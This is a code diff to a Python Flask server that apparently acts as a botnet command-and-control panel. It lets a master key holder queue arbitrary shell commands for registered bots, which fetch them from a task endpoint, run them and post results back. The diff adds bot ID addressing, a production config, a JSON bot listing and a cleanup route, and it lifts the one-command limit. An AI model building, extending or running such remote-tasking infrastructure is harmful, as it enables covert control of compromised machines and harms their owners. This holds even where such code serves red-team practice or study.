@@ -1,8 +1,11 @@
 import os 
+import re
+import json
 import random
 import string
+from IPy import IP
 
-from flask import Flask, url_for, request, redirect, jsonify, render_template, session, send_from_directory 
+from flask import Flask, url_for, request, redirect, jsonify, render_template, session, send_from_directory, Response 
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime  
 
@@ -22,7 +25,7 @@ Also takes are of master console's request/response.
 # ============ Configuration can be change through config.py ===========
 
 app = Flask(__name__)
-app.config.from_object("config.DevConfig")
+app.config.from_object("config.ProdConfig")
 db.app = app
 db.init_app(app)
 
@@ -211,11 +214,12 @@ def register():
         db.session.add(bot)
         db.session.commit()
 
-        return jsonify({'result': 'success'})
+        ## 'botid':bot.id
+        return jsonify({'result': 'success', 'botid': bot.id})
 
 
-@app.route('/bot/<bot_ip>/push', methods=['POST'])
-def botpush(bot_ip):
+@app.route('/bot/<target>/push', methods=['POST'])
+def botpush(target):
     """
     Description: Pushes the command into the bot and cmd Model. The command pushed into the bot and cmd model will later be used in the /task endpoint. 
 
@@ -224,7 +228,7 @@ def botpush(bot_ip):
         - cmd = Command to push to the bot 
     """
 
-    # Error checking 
+    # Error checking  
     error = posterrorcheck(request, 'masterkey', 'cmd')
     if error is not True:
         return error 
@@ -234,33 +238,48 @@ def botpush(bot_ip):
     masterkey = data['masterkey']
     cmd = data['cmd']
 
+    bot_ip = ''
+    bot_id = -1 
+
+    if re.match(r'(\d+\.?){4}\\?$', target):
+        bot_ip = target 
+    else:
+        bot_id = target 
+
     # API Endpoint logic 
+
+    # Master pushed command with specifying bot ip address 
     try:
         # Query and get the bot which has the bot_ip, and then append the command to it 
-        query_bot = Bot.query.filter_by(ip=bot_ip).first()
-        cmd = Command(cmd, query_bot.id, bot_ip)
+        
+        if bot_ip != '':
+            print(bot_ip)
+            query_bot = Bot.query.filter_by(ip=bot_ip).first()
+        else:
+            query_bot = Bot.query.filter_by(id=bot_id).first()
+
+        cmd = Command(cmd, query_bot.id, query_bot.ip)
+        print(cmd)
 
         # Actually push the command to the bot. If there is a previous command queued (making len(query_bot.cmds) >=1 ), ignore.
-        if len(query_bot.cmds) < 1:
-            try:
-                query_bot.cmds.append(cmd)
-                db.session.add(cmd)
-                db.session.commit()
+        try:
+            query_bot.cmds.append(cmd)
+            db.session.add(cmd)
+            db.session.commit()
 
-                print("[DEBUG] Command staged")
+            print("[DEBUG] Command staged")
 
-                return jsonify({'result': 'Command staged'})
+            return jsonify({'result': 'Command staged'})
 
-            except Exception as e:
-                return jsonify({'error': 'Error occurred while staging command'})
-        else:
-            return jsonify({'error': 'Only one command can be staged'})
+        except Exception as e:
+            return jsonify({'error': 'Error occurred while staging command'})
 
     except Exception as e:
-        return jsonify({ 'error': '[-] Bot does not exist. ' + str(e) }) 
+        return jsonify({ 'error': '[-] Pushing command for bot failed. ' + str(e) }) 
 
-@app.route('/bot/<bot_ip>/task', methods=['POST'])
-def bottask(bot_ip):
+
+@app.route('/bot/<bot_id>/task', methods=['POST'])
+def bottask(bot_id):
     """
     Description: Returns the command that is staged for the corresponding bot. The bot will visit this endpoint, retrieve the command, and execute it.
 
@@ -281,15 +300,19 @@ def bottask(bot_ip):
     try:
         # Get the bot corresponding with the bot_ip
         try: 
-            query_bot = Bot.query.filter_by(ip=bot_ip).first()
+            query_bot = Bot.query.filter_by(id=bot_id).first()
             query_bot.set_timestamp(datetime.now())
 
         except Exception as e:
             return jsonify({'result': 'fail', 'error' : '[-] There are no commands for you'})
 
-        # Try getting commands, from the oldest staged command to the lastest staged command. 
+        # Get command for the bot to run. Only getting the latest command.
         try:
-            command = query_bot.cmds[0]
+            command = query_bot.cmds[len(query_bot.cmds)-1]
+
+            if command.result != '':
+                return jsonify({'result': 'fail', 'error':'[-] There are no commands available'})
+
         except Exception as e:
             return jsonify({'result': 'fail', 'error': '[-] There are no commands available'})
 
@@ -299,8 +322,8 @@ def bottask(bot_ip):
     except Exception as e:
         return jsonify({ 'result': 'fail', 'error': str(e) }) 
 
-@app.route('/bot/<bot_ip>/result', methods=['POST'])
-def botresult(bot_ip):
+@app.route('/bot/<bot_id>/result', methods=['POST'])
+def botresult(bot_id):
     """
     Description: API endpoint which the bot comes and reports the result of the staged command. 
     
@@ -329,10 +352,12 @@ def botresult(bot_ip):
             if data['registerkey'] == REGISTERKEY:
                 result = data['result']
 
-                query_bot = Bot.query.filter_by(ip=bot_ip).first()
+                query_bot = Bot.query.filter_by(id=bot_id).first()
                 command = Command.query.filter_by(bot_id=query_bot.id).order_by(Command.id.desc()).first()
                 command.set_result(result)
-                query_bot.cmds.remove(command)
+
+                #query_bot.cmds.clear()
+
                 db.session.commit()
                 
                 # This needs to be changed 
@@ -340,10 +365,17 @@ def botresult(bot_ip):
 
         # Master visiting endpoint. Return result of the command. 
         elif 'masterkey' in data:
+            query_bot = Bot.query.filter_by(id=bot_id).first()
+            
             try:
-                query_bot = Bot.query.filter_by(ip=bot_ip).first()
-                command = Command.query.filter_by(bot_ip=bot_ip).order_by(Command.id.desc()).first()
+                query_bot = Bot.query.filter_by(id=bot_id).first()
+                command = Command.query.filter_by(bot_id=bot_id).order_by(Command.id.desc()).first()
+                print("[DEBUG] command info = ", command.get_info())
+                
                 result = command.result
+
+                #query_bot.cmds.remove(command)
+                db.session.commit()
 
                 if result is None:
                     return jsonify({'error': 'Bot have not called back'})
@@ -393,7 +425,7 @@ def botlist():
     try:
         botlist = Bot.query.all()
     except Exception as e:
-        return jsonify({'error': str(e)})
+        return jsonify({'error': "[-]" + str(e)})
 
     # Refresh bot list. Remove bot if it hasn't come back for TIMER*5 
     for bot in botlist:
@@ -401,15 +433,13 @@ def botlist():
             db.session.delete(bot)
     db.session.commit()
 
-    #print(botlist)
-
-    result = '' 
+    jsonbotlist = []
 
     # Show bot list 
     for bot in botlist:
-        result += bot.get_info() + '\n'
+        jsonbotlist.append(bot.jsonbot())
 
-    return result
+    return Response(json.dumps(jsonbotlist), mimetype='application/json')
 
 @app.route('/bot/commands', methods=['POST'])
 def commandlist():
@@ -515,6 +545,25 @@ def download_file(filename):
     return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
 
 
+@app.route('/cleanup', methods=['POST'])
+def cleanup():
+    
+    # Error checking 
+    error = posterrorcheck(request, 'masterkey')
+    if error is not True:
+        return error 
+
+    try:
+        botlist = Bot.query.all()
+    except Exception as e:
+        return jsonify({'error': str(e)})
+
+    # Refresh any commands that are staged on the bots 
+    for bot in botlist:
+        bot.cmds.clear()
+        db.session.commit()
+    
+    return jsonify({'success': 'All commands staged has been removed and cleaned up'})
 
 # ========================= Flask App Starts =========================
 
